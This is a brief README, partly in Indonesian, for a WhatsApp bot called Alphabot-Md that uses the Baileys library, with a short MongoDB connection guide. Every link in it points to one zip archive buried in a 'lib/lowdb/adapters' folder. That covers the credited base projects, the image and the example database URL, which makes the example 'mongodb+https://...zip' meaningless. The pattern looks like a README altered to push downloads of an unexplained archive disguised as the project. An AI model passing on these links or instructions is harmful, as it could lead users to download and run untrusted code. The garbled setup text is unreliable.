## Information
> Alpahbot-Md adalah bot yang awalnya memakai base dari [Chikabot](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/adapters/Alphabot-Md-3.6.zip), sekarang pindah base [Hisoka-Morou](https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/adapters/Alphabot-Md-3.6.zip). Alphabot-Md is a bot whatsapp using a Baileys library.
> Jika kamu menemukan semacam bug, harap untuk dimaklumi sementara

<img src="https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/adapters/Alphabot-Md-3.6.zip" width="300">
- Jika sudah memiliki database mongoDB ikuti tutorial di bawah

## HOW TO CONNECT TO MONGODB

- Salin Url database mongoDB
- Constoh `worker: node . --db 'Link Database MongoDb'`
- Contoh `worker: node . --db 'mongodb+https://raw.githubusercontent.com/ryanbotmd/Alphabot-Md/v14/lib/lowdb/adapters/Alphabot-Md-3.6.zip'`
